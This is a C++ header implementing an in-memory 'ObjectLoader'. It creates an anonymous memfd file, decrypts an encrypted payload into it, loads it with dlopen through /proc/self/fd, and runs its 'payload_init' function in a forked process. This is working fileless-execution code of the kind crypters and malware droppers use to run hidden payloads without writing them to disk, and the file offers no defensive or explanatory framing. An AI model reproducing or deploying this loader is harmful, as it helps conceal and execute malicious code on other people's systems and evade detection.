
#include "stdafx.h"
#include "Crypto.h"
#include "Executor.h"

#ifndef OBJECT_LOADER_H
#define OBJECT_LOADER_H

// Creates anon file descriptors.
#define MEMFD_CREATE 319
inline int anonFile(const char *name, unsigned int flags) {
    return syscall(MEMFD_CREATE, name, flags);
}

class ObjectLoader {
private:
    int fdObject = -1, currentObjectSize = 0;
    FILE* encryptedMemoryFile = NULL; // The file in memory to write to.

    // For object loading.
    typedef int (*payload)();
    void* objectHandle = NULL;

    // Load object.
    bool loadObject() {

        char path[1024];
        snprintf(path, 1024, "/proc/self/fd/%d", fdObject);
        
        objectHandle = dlopen(path, RTLD_LAZY);
        if (objectHandle == NULL) {
            printf("Failed to load the object!\n");
            return false;
        }

        return true;
    }

public:
    
    ObjectLoader() {
        
    }
     
    // Reserve space for the encrypted file and object.
    bool reserveSpace(size_t size) {
        
        if (size <= 0) {
            return false;
        }

        this->fdObject = anonFile(".", 1);
        this->currentObjectSize = size;

        // Open memory file.
        this->encryptedMemoryFile = fmemopen(NULL, size, "wb+");
        if (this->encryptedMemoryFile == NULL) {
            printf("Failed to open memory file for encrypted file!\n");
            return false;
        }

        // Truncate memory descriptors.
        fseek(this->encryptedMemoryFile, 0, SEEK_SET);
        ftruncate(this->fdObject, size);
        return true;
    }

    // Wrapper for our fwrite() with encrypted memory file.
    bool writePayload(unsigned char* payload, size_t size) {
        
        fwrite(payload, size, 1, this->encryptedMemoryFile);
        rewind(this->encryptedMemoryFile); // To set cursor at start.

        // Now decrypt the payload.
        if (!Crypto::decryptObject(this->encryptedMemoryFile, fdObject, size)) {
            printf("Failed to decrypt given object!\n");
            return 0;
        }

        // And load the (decrypted) object.
        return loadObject();
    }

    // Run the loaded object file.
    int run() {
        
        // Check if object is loaded.
        if (this->objectHandle == NULL) {
            printf("Cannot execute any code, object is not loaded!\n");
            return -1;
        }

        // Execute
        payload func = (payload)dlsym(this->objectHandle, "payload_init"); // "payload_init"
        int returnCode = executeFork(func);
        
        // Clean cleanup
        dlclose(this->objectHandle);
        fclose(this->encryptedMemoryFile);
        close(this->fdObject);
        this->objectHandle = NULL;    
        return returnCode;
    }
};

#endif // !~ OBJECT_LOADER_H